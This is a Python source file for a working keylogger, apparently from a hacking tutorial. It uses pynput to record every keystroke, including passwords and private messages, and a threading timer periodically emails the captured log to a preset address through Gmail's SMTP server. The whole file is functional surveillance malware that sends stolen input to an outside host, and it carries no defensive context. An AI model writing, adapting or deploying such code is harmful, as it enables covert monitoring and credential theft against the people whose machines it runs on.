#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib

class Keylogger:

    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com",
                              port=587)  # We create an instance for an SMTP server and we'll use goolge's SMTP server, that works on pot 587
        server.starttls()  # Then we start a TLS connection using the server that we've just created
        server.login(email, password)  # Now we must log in to our email
        server.sendmail(email, email,
                        message)  # The arguments to send the email are: 1set From, 2nd To and 3rd Content of the email
        server.quit()  # Finally we close the server


    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
            self.append_to_log(current_key)
        except AttributeError:
            if str(key) == "Key.space":
                current_key = " "
                self.append_to_log(current_key)
            elif str(key) == "Key.backspace":
                #self.log += "\b"
                self.log = self.log[:-1]
            else:
                current_key = " " + str(key) + " "
                self.append_to_log(current_key)

    def report(self):
        #print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()